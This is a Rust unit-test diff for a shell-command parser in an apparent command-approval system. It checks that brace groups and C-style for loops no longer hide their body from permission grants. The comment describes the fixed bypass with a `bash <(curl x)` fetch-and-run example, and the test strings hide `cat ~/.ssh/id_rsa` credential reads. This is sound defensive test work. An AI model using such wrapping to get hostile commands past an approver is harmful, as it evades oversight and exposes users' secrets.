@@ -672,6 +672,32 @@ mod tests {
         assert_eq!(plain, vec!["echo ok", "ls"]);
     }
 
+    /// `{ …; }` and `for ((…))` are statements with a body, like a subshell.
+    /// Unregistered, their commands reconstructed as nothing and the rest of
+    /// the line keyed as itself: `{ bash <(curl x); }; git status` read as
+    /// `git status`, so a grant for that command approved the brace group's
+    /// body.
+    #[test]
+    fn brace_group_and_c_style_for_alongside_simple_command_bail_out() {
+        for command in [
+            "{ cat ~/.ssh/id_rsa; }; echo ok",
+            "{ cat ~/.ssh/id_rsa; } && echo ok",
+            "{ cat ~/.ssh/id_rsa; } | echo ok",
+            "for ((i=0;i<1;i++)); do cat ~/.ssh/id_rsa; done; echo ok",
+        ] {
+            let f = ok(command);
+            assert!(f.top_level_segment_strings().is_none(), "{command}");
+            assert!(f.top_level_normalized().is_none(), "{command}");
+            // The body is still walked: deny rules and the safety scan see it.
+            assert!(
+                f.segments
+                    .iter()
+                    .any(|s| s.argv.first().map(String::as_str) == Some("cat")),
+                "{command}"
+            );
+        }
+    }
+
     #[test]
     fn descriptor_less_amp_write_stays_a_write_target() {
         // `>&word` (no fd) is bash's `>word 2>&1` — a real file write
